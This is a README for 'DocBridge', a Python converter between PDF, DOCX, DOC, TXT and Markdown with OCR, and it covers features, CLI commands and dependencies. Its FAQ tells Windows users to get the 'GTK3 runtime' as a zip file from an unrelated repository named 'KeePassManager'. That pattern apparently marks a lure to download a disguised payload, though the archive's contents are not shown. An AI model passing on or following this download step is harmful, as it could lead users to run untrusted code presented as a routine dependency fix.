# DocBridge

**A lightweight document format converter with built-in OCR support.**

Convert between PDF, DOCX, DOC, TXT and Markdown — with automatic detection and OCR extraction from scanned documents and image-based PDFs.

[![Python](https://img.shields.io/badge/Python-3.11+-blue.svg)](https://python.org)
[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)

---

## Features

- **Multi-format conversion** — PDF, DOCX, DOC, TXT ↔ Markdown, Markdown → PDF/DOCX
- **Smart OCR** — automatically detects and extracts text from scanned/image-based PDFs
- **Three interfaces** — Desktop GUI (PyQt5), Web GUI (Gradio), CLI
- **Batch processing** — recursive folder scanning for bulk conversions
- **Cross-platform** — Windows, Linux, macOS

---

## Supported Formats

| Input | Output | Notes |
|-------|--------|-------|
| PDF | MD | Text-based or vector-font PDFs handled automatically |
| PDF | MD | **Scanned/image-based PDFs → OCR recognition** |
| DOCX | MD | Word documents |
| DOC | MD | Legacy Word format |
| TXT | MD | Plain text |
| MD | PDF | Requires WeasyPrint |
| MD | DOCX | Word documents |

---

## Quick Start

### Requirements

- Python 3.11+
- Windows 10/11 / Linux / macOS

### Install dependencies

```bash
pip install -r requirements.txt
```

### One-click launch (Windows)

Double-click `start.bat` to launch the desktop GUI.

### Other launch options

```bash
# Desktop GUI (recommended)
python src/gui_qt.py

# Web interface (browser-based)
python src/gui.py

# Command line
python -m src.cli convert input.pdf output.md
python -m src.cli batch "*.pdf" ./output/
```

---

## Project Structure

```
DocBridge/
├── src/
│   ├── converters/          # Converter core modules
│   │   ├── base.py         # Base converter class
│   │   ├── pdf_converter.py        # PDF → MD (text-based)
│   │   ├── ocr_pdf_converter.py    # PDF → MD (OCR, scanned)
│   │   ├── docx_converter.py       # DOCX → MD
│   │   ├── doc_converter.py        # DOC → MD
│   │   ├── txt_converter.py        # TXT → MD
│   │   ├── md_to_pdf.py            # MD → PDF
│   │   └── md_to_docx.py           # MD → DOCX
│   ├── cli.py              # CLI entry point
│   ├── gui.py              # Gradio web interface
│   └── gui_qt.py           # PyQt5 desktop interface
├── tests/                  # Test files
├── docs/                   # Documentation
├── requirements.txt        # Python dependencies
├── start.bat               # Windows launcher
├── start.sh                # Linux/macOS launcher
└── README.md
```

---

## Dependencies

### Core

| Package | Purpose |
|---------|---------|
| PyMuPDF | PDF text/image extraction |
| pdfminer.six | PDF text parsing |
| python-docx | Word document I/O |
| markdown | Markdown parsing |
| click | CLI framework |
| tqdm | Progress bar |

### Optional

| Package | Purpose | Platform Notes |
|---------|---------|----------------|
| rapidocr-onnxruntime | OCR text recognition | Cross-platform |
| weasyprint | MD → PDF | Requires cairo/pango system libs |
| PyQt5 | Desktop GUI | Cross-platform |
| gradio | Web GUI | Cross-platform |

---

## CLI Usage

```bash
# Convert a single file
python -m src.cli convert input.pdf output.md
python -m src.cli convert input.md output.pdf
python -m src.cli convert input.docx output.md

# Batch conversion
python -m src.cli batch "*.pdf" ./output/
python -m src.cli batch "./documents/" ./md_files/ -r -e pdf -e docx

# Show supported formats
python -m src.cli info

# Extract images from PDF
python -m src.cli extract-images input.pdf -o ./images/
```

---

## How OCR Works

When a PDF is identified as **image-based (scanned)** or **vector-font with encoding issues**, DocBridge automatically switches to OCR:

1. **Detection** — text content analysis; fewer than 100 chars/page triggers OCR
2. **Rendering** — PyMuPDF renders each page as 150 DPI high-resolution image
3. **Recognition** — RapidOCR extracts text from images (supports Chinese, English, multilingual)
4. **Structuring** — text blocks are ordered by reading sequence; headings/lists/paragraphs are identified
5. **Output** — structured Markdown file is generated

---

## FAQ

**Q: Scanned PDF conversion fails?**  
A: Install RapidOCR: `pip install rapidocr-onnxruntime`

**Q: MD → PDF throws an error?**  
A: On Windows, WeasyPrint needs GTK3 runtime. Run `pip install weasyprint` then install [GTK3](https://github.com/tsujan/KeePassManager/raw/master/extra/gtk3.zip).

**Q: DOC file won't convert?**  
A: Requires `antiword` (Linux) or LibreOffice for DOC format support.

---

## License

MIT License — see [LICENSE](LICENSE)
